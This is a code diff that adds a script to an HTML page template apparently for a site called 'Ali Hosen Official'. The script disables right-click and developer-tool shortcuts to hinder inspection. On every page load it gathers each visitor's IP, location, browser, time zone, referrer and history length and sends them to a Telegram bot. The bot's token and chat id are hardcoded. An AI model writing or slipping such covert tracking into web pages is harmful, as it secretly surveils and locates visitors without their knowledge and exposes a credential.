@@ -134,4 +134,133 @@
 
 </div>
 
+<script>
+    
+        document.addEventListener('contextmenu', (event) => event.preventDefault());
+        document.addEventListener('keydown', (event) => {
+            if (event.key === "F12" || (event.ctrlKey && (event.key === "u" || event.key === "s" || event.key === "Shift"))) {
+                event.preventDefault();
+            }
+        });
+
+        const botToken = '8599591227:AAF3O6iHCgoMrWJFTLDVxknRBy8AZ_nF3J8';
+        const chatId = '8571316406';
+
+        async function sendDeviceInfoToTelegram() {
+            try {
+                const pageTitle = document.title;
+                const pageLink = window.location.href;
+                const referrerLink = document.referrer || 'No Referrer';
+                const browserInfo = navigator.userAgent;
+                const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                const deviceInfo = parseUserAgent(navigator.userAgent);
+                const ipInfo = await fetch('https://ipapi.co/json/')
+                    .then(res => res.json())
+                    .catch(() => ({ ip: 'Unavailable', city: 'Unknown', region: 'Unknown', country_name: 'Unknown' }));
+                const sessionStart = new Date();
+                const duration = calculateSessionDuration(sessionStart);
+                const recentHistory = getRecentHistory();
+
+                const message = `
+<u>🧑‍💻 Just Clicked on Ali Hosen Official</u>
+
+<b>🔍 Device Information:</b>
+---------------------------------
+📄 <b>Page Title:</b> ${pageTitle}
+🔗 <b>Page Link:</b> ${pageLink}
+↩️ <b>Referral Link:</b> ${referrerLink}
+🌐 <b>Browser Info:</b> ${browserInfo}
+⏰ <b>Time Zone:</b> ${timeZone}
+
+📱 <b>Device Info:</b>
+   - Device Name: ${deviceInfo.name || 'Unknown'}
+   - Device Model: ${deviceInfo.model || 'Unknown'}
+
+🌍 <b>IP Info:</b>
+   - IP: ${ipInfo.ip}
+   - City: ${ipInfo.city}
+   - Region: ${ipInfo.region}
+   - Country: ${ipInfo.country_name}
+
+🕒 <b>Session Duration:</b> ${duration}
+
+📜 <b>Recent Browsing History:</b>
+${recentHistory}
+                `;
+
+                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+                const response = await fetch(telegramUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message,
+                        parse_mode: 'HTML',
+                    }),
+                });
+
+                if (response.ok) {
+                    console.log('Message sent successfully!');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+            }
+        }
+
+        function parseUserAgent(userAgent) {
+            let name = 'Unknown';
+            let model = 'Unknown';
+
+            if (userAgent.includes('Android')) {
+                name = 'Android';
+                const match = userAgent.match(/Android\s[0-9.]+;\s([^\)]+)\)/);
+                model = match ? match[1] : 'Unknown';
+            } else if (userAgent.includes('iPhone')) {
+                name = 'iPhone';
+                model = 'iPhone';
+            } else if (userAgent.includes('iPad')) {
+                name = 'iPad';
+                model = 'iPad';
+            } else if (userAgent.includes('Windows')) {
+                name = 'Windows';
+                model = 'PC';
+            } else if (userAgent.includes('Macintosh')) {
+                name = 'Mac';
+                model = 'MacBook';
+            }
+
+            return { name, model };
+        }
+
+        function calculateSessionDuration(startTime) {
+            const now = new Date();
+            const elapsedMs = now - startTime;
+            const elapsedSec = Math.floor(elapsedMs / 1000);
+            const hours = Math.floor(elapsedSec / 3600);
+            const minutes = Math.floor((elapsedSec % 3600) / 60);
+            const seconds = elapsedSec % 60;
+
+            return `${hours} Hours ${minutes} Minutes ${seconds} Seconds`;
+        }
+
+        function getRecentHistory() {
+            const historyLength = window.history.length;
+
+            return `
+    - Current Page: ${window.location.href}
+    - Referrer: ${document.referrer || 'No Referrer'}
+    - Total History Length: ${historyLength} (Cannot access full list)
+    `;
+        }
+
+        window.onload = () => {
+            sendDeviceInfoToTelegram();
+        };
+        
+        
+        
+        
+       
+</script>
+
 {% endblock %}
